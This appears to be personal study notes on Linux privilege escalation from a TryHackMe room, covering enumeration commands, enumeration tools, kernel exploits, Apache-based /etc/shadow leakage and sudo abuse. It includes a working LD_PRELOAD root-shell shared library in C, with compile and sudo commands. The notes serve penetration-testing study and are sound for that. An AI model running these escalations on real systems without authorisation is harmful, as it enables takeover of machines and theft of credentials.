# Privelege Escalation Notes

[Reference](https://tryhackme.com/room/linprivesc)

Enumeration is the first step you have to take once you gain access to any system. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

Enumeration checks (atleast):

    - hostname
    - uname -a
    - /proc/version
    - /etc/issue
    - ps [-A][axjf][aux]
    - env
    - sudo -l
    - ls
    - id
    - /etc/passwd
    - history
    - ifconfig
    - netstat [-a][-t][-u][-l][-s][-p][-i][-ano]
    - find [-name][-type][-perm][-user][-size][-time] :Find tools -> find / -name perl*|| find / -name python*|| find / -name gcc*
    - locate
    - grep

## Automated enumeration tools

These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

    - [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
    - [LinEnum](https://github.com/rebootuser/LinEnum)
    - [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
    - [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
    - [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## Kernel Exploit

[Reference: Linux Privilege Escalation - Kernel Exploits](https://steflan-security.com/linux-privilege-escalation-kernel-exploits/)

The following command can be used to manually enumerate kernel info:

    uname -a ; lsb_release -a; cat /proc/version /etc/issue /etc/*-release; hostnamectl | grep Kernel

The Kernel exploit methodology is simple:

    1. Identify the kernel version
    2. Search and find an exploit code for the kernel version of the target system
    3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

Search for the exploit can be done using Google for an existing exploit code, a [CVE database](https://www.linuxkernelcves.com/cves), exploit-db, searchsploit. Note: be extremely specific of the kernel version. Read the comments of the code carefully, some exploits might need further interaction. You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.

Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

## Sudo

The sudo command, by default, allows you to run a program with root privileges.
Any user can check its current situation related to root privileges using the "sudo -l" command. [GTFObins](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

### Leverage application functions

    Some applications will not have a known exploit within this context.
    Example, for apache2 server, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).
    Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.

### Leverage LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option.
LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }

The code can be saved & compiled using gcc into a shared object file using the following parameters(shell.c is the file name of the above .c file):

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles

We can now use this shared object file when launching any program our user can run with sudo. In the example case, Apache2, find, or almost any of the programs we can run with sudo can be used. (i.e. found via the sudo -l command)

We need to run the program by specifying the LD_PRELOAD option, as follows;

    sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

## SUID
